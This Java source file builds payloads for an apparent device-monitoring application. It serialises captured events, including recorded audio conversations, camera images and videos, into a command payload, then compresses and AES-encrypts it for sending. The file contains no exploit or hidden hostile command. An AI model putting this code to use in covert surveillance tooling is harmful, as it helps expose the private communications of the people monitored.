package com.vvt.prot.databuilder;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import com.vvt.compression.GZipCompressListener;
import com.vvt.compression.GZipCompressor;
import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.encryption.AESListener;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.prot.CommandData;
import com.vvt.prot.DataProvider;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.command.SendEvents;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.event.AudioConvEvent;
import com.vvt.prot.event.AudioFileEvent;
import com.vvt.prot.event.CameraImageEvent;
import com.vvt.prot.event.PEvent;
import com.vvt.prot.event.VideoFileEvent;
import com.vvt.prot.parser.BufferEventParser;
import com.vvt.prot.parser.FileEventParser;
import com.vvt.std.ByteUtil;
import com.vvt.std.FileUtil;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;

public class SendEventPayloadBuilder extends PayloadBuilder implements AESListener, GZipCompressListener {
	
	private static final String TAG = "StoreEventPayloadBuilder";
	private static final String tempExtension = ".tmp";	
	private CommandMetaData cmdMetaData = null;
	private SendEvents event = null;
	private FileEventParser fileEventParser = Global.getFileEventParser();
	private boolean compressSuccess = false;
	private boolean encryptedSuccess = false;
	
	public PayloadBuilderResponse buildPayload(CommandMetaData cmdMetaData, CommandData cmdData, 
												String payloadPath, TransportDirectives transport) 
												throws IllegalArgumentException, InterruptedException, IOException  {
		PayloadBuilderResponse response = null;
		this.cmdMetaData = cmdMetaData;
		event = (SendEvents) cmdData;
		byte[] key = AESKeyGenerator.generateAESKey();
		if (transport.equals(TransportDirectives.RESUMABLE)) {
			response = buildFilePayload(key, payloadPath);			
		} else {
			response = buildBufferPayload(key);
		}
		return response;
	}
	
	private PayloadBuilderResponse buildFilePayload(byte[] key, String payloadPath) throws IllegalArgumentException, IOException, InterruptedException {
		writePayloadFile(payloadPath);
		// Regarding we will not compress or encrypt a large file so that means other events except media can compress or encrypt.
		compressPayload(payloadPath);
		encryptPayload(payloadPath, key);
		//Set Response.
		return setResponse(PayloadType.FILE, key, payloadPath, null);
	}
	
	private PayloadBuilderResponse buildBufferPayload(byte[] key) throws IOException, InterruptedException {
		byte[] payload = writeBuffer();
		byte[] cmpPayload = compressPayload(payload);
		byte[] encPayload = encryptPayload(cmpPayload, key);
		//Set Response.
		return setResponse(PayloadType.BUFFER, key, null, encPayload);
	}
	
	private PayloadBuilderResponse setResponse(PayloadType type, byte[] key, String filePath, byte[] data) {
		PayloadBuilderResponse response = new PayloadBuilderResponse();
		response.setPayloadType(type);
		response.setAesKey(key);
		response.setFilePath(filePath);
		response.setByteData(data);
		return response;
	}
	
	private void writePayloadFile(String payloadPath) throws IOException {
		FileConnection fCon = null;
		OutputStream os = null;
		int count = 0;
		int length = 0;
		
		try {
			fCon = (FileConnection)Connector.open(payloadPath, Connector.READ_WRITE);
			if (fCon.exists()) {
				fCon.delete();
			}
			fCon.create();
			os = fCon.openOutputStream();
			short cmdCode = (short)event.getCommand().getId();
			os.write(ByteUtil.toByte(cmdCode));
			//Start to write Command Data
			short eventCount = (short)event.getEventCount();
			os.write(ByteUtil.toByte(eventCount));
			DataProvider cmdDataProvider = event.getEventIterator();
			if (eventCount > 0) {
				while (cmdDataProvider.hasNext()) {
					PEvent pEvent = (PEvent)cmdDataProvider.getObject();
					if (pEvent instanceof AudioFileEvent ||
							pEvent instanceof AudioConvEvent ||
							pEvent instanceof CameraImageEvent ||
							pEvent instanceof VideoFileEvent) {						
						fileEventParser.parseEvent(pEvent, os);
					} else {
						count++;					 
						//TODO: NEW --> Limit Events size
						byte[] buffer = BufferEventParser.parseEvent(pEvent);
						length += buffer.length;
						os.write(buffer);
						if (length > ApplicationInfo.SIZE_LIMITED) {
							os.close();
							fCon.close();
							fCon = (FileConnection)Connector.open(payloadPath, Connector.READ_WRITE);
							os = fCon.openOutputStream(2); //re-write event count
							os.write(ByteUtil.toByte((short)count));							
							break;
						}
					}
				}				
			}
			cmdDataProvider.readDataDone();			
		} finally {
			IOUtil.close(fCon);
			IOUtil.close(os);
		}
	}	
	
	private byte[] writeBuffer() throws IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		DataOutputStream dos = new DataOutputStream(bos);
		short cmdCode = (short)event.getCommand().getId();
		dos.write(ByteUtil.toByte(cmdCode));
		//Start to write Command Data
		short eventCount = (short)event.getEventCount();
		dos.write(ByteUtil.toByte(eventCount));
		if (eventCount > 0) {
			DataProvider cmdDataProvider = event.getEventIterator();
			while (cmdDataProvider.hasNext()) {
				PEvent pEvent = (PEvent)cmdDataProvider.getObject();
				dos.write(BufferEventParser.parseEvent(pEvent));
			}
		}
		return bos.toByteArray();
	}
	
	private void compressPayload(String inputFile) throws InterruptedException, IOException {
		byte compressCode = (byte)cmdMetaData.getCompressionCode();
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".compressPayload(file)", "compressCode: " + compressCode);
		}
		if (compressCode != 0) {			
			GZipCompressor gzipComp = new GZipCompressor(inputFile,inputFile + tempExtension, this);
			gzipComp.compress();
			gzipComp.join();
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".compressPayload(file)", "Success?: " + compressSuccess);
			}
			if (compressSuccess) {
				compressSuccess = false;
				FileUtil.renameFile(inputFile + tempExtension, inputFile);
			} else {
				//Set COMPRESSION_CODE = 0
				cmdMetaData.setCompressionCode(0);
			}
		}
	}
	
	private byte[] compressPayload(byte[] payload) throws InterruptedException, IOException {
		byte compressCode = (byte)cmdMetaData.getCompressionCode();
		if (compressCode != 0) {			
			byte[] cmpPayload = GZipCompressor.compress(payload);
			payload = cmpPayload;
		}
		return payload;
	}
	
	private void encryptPayload(String inputFile, byte[] key) throws InterruptedException, IOException {
		byte encryptCode = (byte)cmdMetaData.getEncryptionCode();
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".encryptPayload(file)", "encryptCode: " + encryptCode);
		}
		if (encryptCode != 0) {
			AESEncryptor enc = new AESEncryptor(key, inputFile, inputFile + tempExtension, this);
			enc.encrypt();
			enc.join();
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".encryptPayload(file)", "Success?: " + encryptedSuccess);
			}
			if (encryptedSuccess) {
				encryptedSuccess = false;
				FileUtil.renameFile(inputFile + tempExtension, inputFile);
			} else {
				//Set ENCRYPTION_CODE = 0
				cmdMetaData.setEncryptionCode(0);
			}
		}
	}
	
	private byte[] encryptPayload(byte[] payload, byte[] key) throws IOException {
		byte encryptCode = (byte)cmdMetaData.getEncryptionCode();
		if (encryptCode != 0) {
			byte[] encPayload = AESEncryptor.encrypt(key, payload);
			payload = encPayload;
		}
		return payload;
	}
	
	public void CompressCompleted() {
		compressSuccess = true;
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".CompressCompleted()", "Success");
		}
	}
	
	public void CompressError(String err) {
		//Set COMPRESSION_CODE = 0
		cmdMetaData.setCompressionCode(0);
		compressSuccess = false;
		Log.error(TAG + ".CompressError()", "Error: " + err);
	}

	public void AESEncryptionCompleted(String file) {
		encryptedSuccess = true;
		if (Log.isDebugEnable()) {
			Log.debug(TAG + ".AESEncryptionCompleted()", "Success");
		}
	}
	
	public void AESEncryptionError(String err) {
		//Set ENCRYPTION_CODE = 0
		cmdMetaData.setEncryptionCode(0);
		encryptedSuccess = false;
		Log.error(TAG + ".AESEncryptionError()", "Error: " + err);
	}
}
